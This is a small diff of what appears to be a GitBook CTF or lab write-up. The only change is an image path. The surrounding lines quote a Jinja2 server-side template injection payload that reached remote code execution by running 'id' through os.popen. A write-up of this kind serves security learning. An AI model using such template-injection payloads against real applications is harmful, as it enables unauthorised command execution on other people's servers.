@@ -126,7 +126,7 @@ I tested both Twig and Jinja2 payloads, and got RCE using this payload:
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (7).png" alt=""><figcaption></figcaption></figure>
 
 I tried to execute this, but it didn't work:
 
